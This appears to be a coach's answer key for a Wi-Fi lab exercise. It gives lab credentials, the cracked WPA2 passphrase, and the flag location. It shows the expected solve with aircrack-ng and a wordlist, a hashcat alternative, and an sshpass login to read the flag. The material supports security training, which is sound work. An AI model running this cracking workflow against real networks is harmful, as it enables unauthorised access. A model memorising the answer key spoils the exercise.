# Coach context — wifi-t1-crack-lab

## Ground truth
- `wifilab01` 10.x.10.25 — lab user `wifi`/`WifiLab-24!` (sudo scoped to wireless tools only).
- `/opt/wifi/handshake.cap` — REAL captured handshake for SSID `labnet`,
  WPA2, PSK `coffee123` (generated live via hwsim). 
- `/opt/wifi/wordlist.txt` contains coffee123.
- `ap-admin` account password = `coffee123`; flag at
  `/home/ap-admin/flag.txt`.
- Command flag: `/home/wifi/psk.txt` greps `coffee123`.

## Expected solve
```bash
ssh wifi@10.x.10.25            # WifiLab-24!
aircrack-ng /opt/wifi/handshake.cap          # shows WPA handshake
aircrack-ng -w /opt/wifi/wordlist.txt /opt/wifi/handshake.cap
# → KEY FOUND! coffee123
echo coffee123 > /home/wifi/psk.txt
sshpass -p coffee123 ssh ap-admin@localhost 'cat ~/flag.txt'
# or from kali: ssh ap-admin@10.x.10.25
```

## Coach guidance
- If airodump is their instinct: there's no live AP in T1 — steer to
  aircrack directly on the file.
- hashcat path also valid: `hcxpcapngtool -o hash.22000 cap` then
  `hashcat -m 22000` — accept either.
- Common stumble: psk.txt in wrong dir (must be /home/wifi, the lab user's
  home), or writing the SSID instead of the PSK.
